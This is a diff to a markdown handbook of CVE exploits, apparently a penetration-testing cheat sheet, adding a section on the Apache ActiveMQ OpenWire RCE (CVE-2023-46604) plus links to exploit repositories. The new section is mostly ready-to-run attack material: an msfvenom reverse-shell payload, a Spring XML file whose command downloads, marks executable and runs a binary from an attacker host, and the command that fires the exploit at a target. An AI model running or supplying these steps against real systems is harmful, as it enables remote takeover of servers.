@@ -28,7 +28,7 @@
 - [CVE-2023-23397: Microsoft Outlook (Click-to-Run) LPE (0-day) (PowerShell Implementation)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-23397-Microsoft-Outlook-Click-to-Run-LPE-0-day-PowerShell-Implementation)
 - [CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-32629-CVE-2023-2640-GameOverlay-Ubuntu-Kernel-Exploit-LPE-0-day)
 - [CVE-2023-38146: ThemeBleed RCE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-38146-ThemeBleed-RCE)
-- [CVE-2023-43641: GNOME libcue RCE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-43641-GNOME-libcue-RCE)
+- [CVE-2023-46604: Apache ActiveMQ OpenWire Transport RCE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-46604-Apache-ActiveMQ-OpenWire-Transport-RCE)
 - [CVE-2023-4911: Looney Tunables LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-4911-Looney-Tunables-LPE)
 - [GodPotato LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#GodPotato-LPE)
 - [Juicy Potato LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Juicy-Potato-LPE)
@@ -139,6 +139,7 @@
 | CVE-2023-36874 | Windows Error Reporting Service LPE (0-day) | https://github.com/Wh04m1001/CVE-2023-36874 |
 | CVE-2023-38146 | ThemeBleed RCE | https://github.com/gabe-k/themebleed |
 | CVE-2023-38831 | WinRAR Exploit (0-day) | https://github.com/b1tg/CVE-2023-38831-winrar-exploit |
+| CVE-2023-43641 | GNOME libcue RCE | https://github.com/github/securitylab/tree/0a8ede65e0ac860d195868b093d3ddcbd00e6997/SecurityExploits/libcue/track_set_index_CVE-2023-43641 |
 | CVE-2023-46604 | Apache ActiveMQ OpenWire Transport RCE | https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ |
 | CVE-2023-4911 | Looney Tunables LPE | https://github.com/RickdeJager/CVE-2023-4911 |
 | n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
@@ -1145,6 +1146,38 @@ PS C:\> .\ThemeBleed.exe make_theme <LHOST> aero.theme
 
 ```c
 PS C:\> .\ThemeBleed.exe server
+```
+
+## CVE-2023-46604: Apache ActiveMQ OpenWire Transport RCE
+
+> https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ
+
+```c
+$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o <FILE>.elf
+```
+
+```c
+$ cat poc-linux.xml 
+<?xml version="1.0" encoding="UTF-8" ?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+   xsi:schemaLocation="
+ http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+        <constructor-arg>
+        <list>
+            <value>sh</value>
+            <value>-c</value>
+            <!-- The command below downloads the file and saves it as test.elf -->
+            <value>curl -s -o <FILE>.elf http://<LHOST>/<FILE>.elf; chmod +x ./<FILE>.elf; ./<FILE>.elf</value>
+        </list>
+        </constructor-arg>
+    </bean>
+</beans>
+```
+
+```c
+$ go run main.go -i <RHOST> -p 61616 -u http://<LHOST>/poc-linux.xml
 ```
 
 ## CVE-2023-4911: Looney Tunables LPE
